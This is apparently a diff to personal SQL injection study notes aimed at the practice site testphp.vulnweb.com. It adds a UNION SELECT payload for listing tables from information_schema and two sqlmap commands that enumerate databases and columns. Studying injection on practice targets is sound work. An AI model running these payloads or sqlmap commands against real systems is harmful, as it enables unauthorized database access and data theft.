@@ -13,6 +13,9 @@ Display column names of the specific table:
 5    1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='SCHEMATA
 
 
+ ' UNION SELECT NULL, table_name FROM information_schema.tables##
+
+
 Using URL
 
 Visit:   http://testphp.vulnweb.com/artists.php.
@@ -30,5 +33,25 @@ Visit:   http://testphp.vulnweb.com/artists.php.
 Extract Table and Column Names
 
 5        http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema='target_database'
+
+
+
+
+
+
+
+
+
+
+
+Sql map 
+
+
+step 1 :   sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -dbs
+step 2  :   sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D information_schema --columns
+
+
+
+
 
 
